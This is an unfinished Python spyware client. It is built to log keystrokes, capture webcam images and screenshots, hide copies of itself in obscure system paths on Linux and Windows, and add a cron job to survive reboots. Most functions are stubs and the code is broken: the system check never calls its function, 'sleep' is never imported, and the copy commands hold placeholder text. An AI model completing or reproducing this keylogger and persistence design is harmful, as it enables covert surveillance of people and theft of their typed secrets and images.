import os
import ftplib
#import cv2
import platform
import getpass
import sys
import threading
from crontab import CronTab

class listener():
    
    #log keys and if there is an error pass
    def log_keys(self):
        try:
            #generate the text file for logging keys
            with open("logged_text.txt", 'w') as file:
                #add to this later
                print()

            #activate the listener
        except:

            pass
    
    #occasional screenshots of the person behind the camera of the computer
    def camera_screenshot(self):
        #not finished yet
        print()
    
    #screenshots of the screen every .5 seconds
    def computer_screenshot(self):
        #not finished yet
        sleep(.5)
        
        print()

try:
    if platform.system == 'Linux':
        #saving a copy of the program in a deep location in the computer
        os.system('touch /opt/client.py')
        os.system('echo (insert entire script here) > /opt/client.py')

        #adding a link to the file that is saved deep in the computer to 
        #the crontab for on reboot
        new_cron = CronTab(user=getpass.getuser())
        job = new_cron.new(command='python ')

    elif platform.system == 'Windows':
        #i am going to start out with doing windows.
        
        #saving a copy of the program in a deep location in the computer
        os.system('type nul > C:\Drivers\network\client.py')
        os.system('type (insert entire script here) > C:\Drivers\network\client.py')

        #change the directory to the network drive
        os.chdir('C:\Drivers\network')

        #initialize the listener object
        spy = listener()

        #add the multiprocessing thing here with each function on a different process in the listener class
            
except:
    sys.exit(1)